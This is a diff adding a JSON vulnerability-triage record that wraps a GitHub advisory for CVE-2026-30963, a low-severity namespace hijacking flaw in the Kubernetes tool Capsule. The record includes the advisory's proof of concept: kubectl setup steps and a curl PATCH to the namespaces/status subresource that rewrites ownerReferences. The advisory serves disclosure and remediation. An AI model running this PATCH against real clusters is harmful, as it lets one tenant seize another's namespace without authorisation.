@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/177493686?v=4\", \"events_url\": \"https://api.github.com/users/xy585/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/xy585/followers\", \"following_url\": \"https://api.github.com/users/xy585/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/xy585/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/xy585\", \"id\": 177493686, \"login\": \"xy585\", \"node_id\": \"U_kgDOCpRWtg\", \"organizations_url\": \"https://api.github.com/users/xy585/orgs\", \"received_events_url\": \"https://api.github.com/users/xy585/received_events\", \"repos_url\": \"https://api.github.com/users/xy585/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/xy585/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/xy585/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/xy585\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-30963\", \"cvss\": {\"score\": 3.9, \"vector_string\": \"CVSS:3.1/AV:N/AC:H/PR:H/UI:R/S:U/C:L/I:L/A:L\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 3.9, \"vector_string\": \"CVSS:3.1/AV:N/AC:H/PR:H/UI:R/S:U/C:L/I:L/A:L\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-20\", \"name\": \"Improper Input Validation\"}], \"description\": \"### Summary\\nTo defend against namespace hijacking achieved through update/patch operations on namespaces, Capsule uses a webhook to validate update requests targeting namespaces. However, in Kubernetes, the namespace/finalize and namespace/status subresource APIs can also modify various fields of a namespace, including the metadata field. The webhook does not define interception rules for these subresources. As a result, if a tenant administrator has permission to modify namespace/status or namespace/finalize, they can successfully perform namespace hijacking.\\n\\n### Details\\nWhen Capsule uses a ValidatingWebhookConfiguration to intercept changes to namespace resources, it does not intercept modification requests initiated through namespace subresource APIs (see: https://github.com/projectcapsule/capsule/blob/main/charts/capsule/templates/validatingwebhookconfiguration.yaml#L193). Through subresource APIs, it is still possible to modify the metadata field of a namespace resource, enabling hijacking.\\n\\n### PoC\\nOpen two terminals and create two tenants:\\n```\\nkubectl create -f - << EOF\\napiVersion: capsule.clastix.io/v1beta2\\nkind: Tenant\\nmetadata:\\n  name: oil\\nspec:\\n  owners:\\n  - name: alice\\n    kind: User\\nEOF\\n\\n./hack/create-user.sh alice solar\\nexport KUBECONFIG=alice-solar.kubeconfig\\nkubectl create namespace solar-production # alice creates the namespace\\n```\\n\\n```\\nkubectl create -f - << EOF\\napiVersion: capsule.clastix.io/v1beta2\\nkind: Tenant\\nmetadata:\\n  name: attacker\\nspec:\\n  owners:\\n  - name: attacker\\n    kind: User\\nEOF\\n\\n./hack/create-user.sh attacker attacker\\nexport KUBECONFIG=attacker-attacker.kubeconfig\\n```\\n\\nWhen the attacker has permission to modify namespace/status or namespace/finalize, they can hijack other namespaces. Here we grant the attacker the relevant permissions:\\n```\\nkubectl create clusterrole status --verb=patch --resource=namespaces/status\\nkubectl create clusterrolebinding status --clusterrole=status --user=attacker\\n```\\nThe attacker then sends a PATCH request to namespace/status to hijack the namespace created by alice:\\n```\\ncurl -k --cert ./attacker-attacker.crt --key attacker-attacker.key --request PATCH 'https://192.168.201.12:6443/api/v1/namespaces/solar-production/status' \\\\\\n--header 'Content-Type: application/json-patch+json' \\\\\\n--data '[\\n    {\\n      \\\"op\\\": \\\"replace\\\",\\n      \\\"path\\\": \\\"/metadata/ownerReferences\\\",\\n      \\\"value\\\": [\\n        {\\n          \\\"apiVersion\\\": \\\"capsule.clastix.io/v1beta2\\\",\\n            \\\"kind\\\": \\\"Tenant\\\",\\n            \\\"name\\\": \\\"attacker\\\",\\n            \\\"uid\\\": \\\"1fcb9c9b-b552-4974-a248-32be66a2188c\\\"\\n        }\\n      ]\\n    }\\n  ]'\\n```\\n\\n### Impact\\nhijack namespace\\n\\n### Remediation\\nTo mitigate this issue, add the following two subresources to the resources list in the ValidatingWebhookConfiguration rules:\\n```\\n    resources:\\n    - namespaces\\n    - namespaces/status\\n\\t- namespace/finalize\\n```\", \"epss\": {\"percentage\": 0.00202, \"percentile\": 0.10141}, \"ghsa_id\": \"GHSA-2ww6-hf35-mfjm\", \"github_reviewed_at\": \"2026-05-28T17:01:41Z\", \"html_url\": \"https://github.com/advisories/GHSA-2ww6-hf35-mfjm\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-2ww6-hf35-mfjm\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-30963\"}], \"nvd_published_at\": \"2026-06-01T19:16:22Z\", \"published_at\": \"2026-05-28T17:01:41Z\", \"references\": [\"https://github.com/projectcapsule/capsule/security/advisories/GHSA-2ww6-hf35-mfjm\", \"https://github.com/projectcapsule/capsule/releases/tag/v0.13.0\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-30963\", \"https://github.com/advisories/GHSA-2ww6-hf35-mfjm\"], \"repository_advisory_url\": \"https://api.github.com/repos/projectcapsule/capsule/security-advisories/GHSA-2ww6-hf35-mfjm\", \"severity\": \"low\", \"source_code_location\": \"https://github.com/projectcapsule/capsule\", \"summary\": \"Capsule Namespace Hijacking via subresource\", \"type\": \"reviewed\", \"updated_at\": \"2026-06-09T10:50:52Z\", \"url\": \"https://api.github.com/advisories/GHSA-2ww6-hf35-mfjm\", \"vulnerabilities\": [{\"first_patched_version\": \"0.13.0\", \"package\": {\"ecosystem\": \"go\", \"name\": \"github.com/projectcapsule/capsule\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"< 0.13.0\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-2ww6-hf35-mfjm",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "github.com/projectcapsule/capsule: < 0.13.0"
+    ],
+    "authentication_required": true,
+    "cves": [
+      "CVE-2026-30963"
+    ],
+    "cvss_score": 3.9,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:H/UI:R/S:U/C:L/I:L/A:L",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "github.com/projectcapsule/capsule"
+    ],
+    "remote": true,
+    "vendor_severity": "low"
+  },
+  "first_seen_at": "2026-07-20T19:51:59.626225Z",
+  "provenance": {
+    "content_sha256": "6b0c77a108c837b5248e1a530b4aa7c83133e28907a2feb015f4b52f56d75d0d",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-05-28T17:01:41Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-2ww6-hf35-mfjm",
+  "status": "active",
+  "title": "Capsule Namespace Hijacking via subresource",
+  "updated_at": "2026-06-09T10:50:52Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-2ww6-hf35-mfjm"
+}
